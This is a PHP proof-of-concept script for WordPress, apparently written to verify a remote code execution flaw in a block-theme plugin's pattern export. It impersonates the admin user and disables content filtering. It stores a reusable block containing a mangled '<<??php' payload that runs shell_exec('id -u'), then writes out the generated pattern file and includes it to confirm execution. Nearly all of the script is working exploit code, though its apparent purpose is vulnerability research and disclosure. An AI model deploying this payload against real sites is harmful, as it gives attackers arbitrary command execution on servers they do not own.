<?php
error_reporting(E_ERROR|E_PARSE);
function out($k,$v){ echo $k.': '.$v."\n"; }
@unlink(get_stylesheet_directory().'/CBT_RCE_PROOF.txt');
@unlink(get_stylesheet_directory().'/patterns/cbtpwn4.php');
$admin = get_user_by('login','admin'); wp_set_current_user($admin->ID);
kses_remove_filters(); // admin has unfiltered_html -> content NOT kses filtered (real flow)
$payload = '<<??php file_put_contents(__DIR__ . "/../CBT_RCE_PROOF.txt", "RCE uid=" . trim(shell_exec("id -u"))); ?>';
$block_id = wp_insert_post(wp_slash(array('post_type'=>'wp_block','post_status'=>'publish','post_title'=>'cbtpwn4','post_content'=>$payload)), true);
out('stored_intact', strpos(get_post($block_id)->post_content,'<<??php')!==false?'YES':('MANGLED: '.get_post($block_id)->post_content));
$genf = CBT_Theme_Patterns::pattern_from_wp_block(get_post($block_id));
$dir = get_stylesheet_directory().'/patterns'; if(!is_dir($dir)) wp_mkdir_p($dir);
$file = $dir.'/cbtpwn4.php';
file_put_contents($file, $genf->content);
out('GENERATED_PHP', file_get_contents($file));
require $file;
clearstatcache();
$proof = get_stylesheet_directory().'/CBT_RCE_PROOF.txt';
out('RCE_EXECUTED', file_exists($proof)?('*** '.trim(file_get_contents($proof)).' ***'):'no');
@unlink($proof); @unlink($file); wp_delete_post($block_id,true);
